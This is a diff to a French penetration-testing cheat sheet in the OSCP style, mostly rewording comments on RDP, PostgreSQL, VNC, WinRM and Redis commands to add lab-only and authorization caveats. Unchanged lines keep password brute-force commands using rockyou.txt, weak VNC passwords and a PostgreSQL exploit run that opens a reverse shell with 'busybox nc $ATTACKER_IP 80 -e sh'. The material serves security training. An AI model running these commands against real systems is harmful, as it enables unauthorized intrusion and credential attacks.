@@ -2371,11 +2371,11 @@ hydra -L <user_list> -P <password_list> -s 3389 rdp://<IP>
 <p class="oscp-command-note">RDP : tester les identifiants de laboratoire avec Crowbar ou CrackMapExec.</p>
 
 ```bash
-# Utilisation de Crowbar
+# Tester l'authentification RDP avec Crowbar (autorisation requise ; risque de verrouillage)
 crowbar -b rdp -s <target_ip>/32 -U users.txt -C rockyou.txt
 
-# Utilisation de CrackMapExec
-crackmapexec rdp <target_ip> -u users.txt -p rockyou.txt
+# Avec NetExec : vérifier des identifiants RDP dans un laboratoire autorisé
+nxc rdp 192.0.2.10 -u utilisateurs.txt -p mots_de_passe.txt
 
 ```
 
@@ -2394,7 +2394,7 @@ xfreerdp /v:192.0.2.10 /u:utilisateur /cert:ignore +clipboard /size:1920x1080
 # Alternative ancienne : rdesktop (préférer FreeRDP si disponible)
 rdesktop -u $USER -p $PASSWORD -g 1920x1080 <ip>
 
-# Connexion en utilisant rdesktop sans identifiants
+# Ouvrir rdesktop et saisir les identifiants lorsque le serveur le demande
 rdesktop <ip>
 
 ```
@@ -2443,9 +2443,9 @@ psql -h <IP_CIBLE> -p 5432 -U <UTILISATEUR> -W
 <p class="oscp-command-note">Exécuter 50847.py avec les paramètres indiqués pour «PostgreSQL».</p>
 
 ```bash
-# Versions mentionnées comme potentiellement affectées par une RCE : vérifier la version exacte et les correctifs.
+# Avant tout test d'exploitation PostgreSQL, vérifier la version exacte, les correctifs et les conditions de la CVE.
 
-# Exécutez le script d'exploitation pour obtenir l'exécution de code à distance
+# Exemple historique d'exploitation : script externe non audité, ne pas exécuter sans vérification préalable
 python3 50847.py -i <ip> -p 5437 -c "busybox nc $ATTACKER_IP 80 -e sh"
 
 ```
@@ -2475,16 +2475,16 @@ DROP TABLE IF EXISTS cmd_exec;
 # Dans l'invite psql : lister les bases de données
 \l
 
-# Se connecter à une base de données précise
+# Dans psql : basculer vers une base de données existante
 \c <DB_NAME>
 
-# Lister les tables de la base de données courante
+# Dans psql : lister les tables visibles du schéma courant
 \dt
 
-# Afficher la structure d'une table
+# Dans psql : afficher les colonnes et les types d'une table
 \d <TABLE_NAME>
 
-# Interroger le contenu d'une table spécifique
+# Requête SQL : lire les lignes d'une table autorisée
 SELECT * FROM <TABLE_NAME>;
 
 # Afficher les colonnes, types et informations supplémentaires d'une table
@@ -2493,25 +2493,25 @@ SELECT * FROM <TABLE_NAME>;
 # Exemple de filtre SQL sur une table et une colonne qui doivent réellement exister
 SELECT * FROM users WHERE attribute = 'value';
 
-# Exemple de commande pour lister toutes les tables et leurs colonnes
+# Interroger information_schema pour obtenir les colonnes du schéma public
 SELECT table_name, column_name, data_type
 FROM information_schema.columns
 WHERE table_schema = 'public';
 
-# Exécuter une commande SQL pour créer une nouvelle table
+# Créer une table de démonstration (modifie la base ; laboratoire uniquement)
 CREATE TABLE test_table (
     id SERIAL PRIMARY KEY,
     name VARCHAR(100),
     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 );
 
-# Insérer des données dans une table de test
+# Insérer une ligne dans la table de démonstration
 INSERT INTO test_table (name) VALUES ('example_data');
 
-# Modifier les données d’une table
+# Modifier des données existantes (requête d'écriture ; vérifier WHERE)
 UPDATE test_table SET name = 'updated_data' WHERE id = 1;
 
-# Supprimer des données d’une table
+# Supprimer des données existantes (requête destructive ; vérifier WHERE)
 DELETE FROM test_table WHERE id = 1;
 
 ```
@@ -2546,17 +2546,18 @@ hydra -L <user_list> -P <password_list> vnc://<ip>
 <p class="oscp-command-note">Exemple de résultat d'un service VNC</p>
 
 ```text
-No Password
+# Exemples de mots de passe faibles à ne tester que dans un laboratoire
+(aucun mot de passe)
 vnc
 1234
 
 ```
 
 ```text
-1. Explore the filesystem
-2. Run commands
-3. Capture screenshots with scrot
-4. Manipulate files
+1. Examiner les fichiers accessibles selon les droits de la session
+2. Vérifier les commandes autorisées
+3. Capturer l'écran uniquement avec autorisation
+4. Manipuler des fichiers de test uniquement
 
 ```
 
@@ -2579,7 +2580,7 @@ crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
 ```
 
 ```powershell
-# Utilisation de PowerShell pour se connecter à WinRM
+# Depuis PowerShell : ouvrir une session distante WinRM (authentification et droits requis)
 Enter-PSSession -ComputerName <IP_CIBLE> -Credential (Get-Credential)
 
 ```
@@ -2631,7 +2632,7 @@ redis-cli -h <IP_CIBLE> -p 6379 --askpass
 <p class="oscp-command-note">Rechercher des références de vulnérabilités connues.</p>
 
 ```bash
-# Recherche de vulnérabilités et de techniques d'exploitation connues de Redis
+# Rechercher les références Redis locales avec SearchSploit (ne prouve pas la vulnérabilité de la cible)
 searchsploit redis
 
 # Exécutez un serveur Redis rogue pour capturer des données ou exécuter des commandes
@@ -2675,7 +2676,7 @@ nc -nv <IP_CIBLE> <PORT_TCP>
 ```
 
 ```bash
-# Toujours lister les commandes ou options disponibles pour recueillir plus d'informations sur le service
+# Envoyer help uniquement si le protocole du service prend en charge cette commande
 help
 
 ```
@@ -2700,7 +2701,7 @@ printf 'list\n' | nc -nv "$IP_CIBLE" "$PORT_TCP"
 # Par exemple, si le service est un outil de gestion, les commandes peuvent inclure la liste des utilisateurs ou des configurations de requête
 
 # Exemple de commandes peut inclure :
-# - Listing users or available configurations
+# - Lister les utilisateurs ou les paramètres disponibles, si le protocole le permet
 # - N'exécuter les commandes administratives que dans le périmètre autorisé
 # - Collecte d'informations sur l'état ou la configuration du service
 
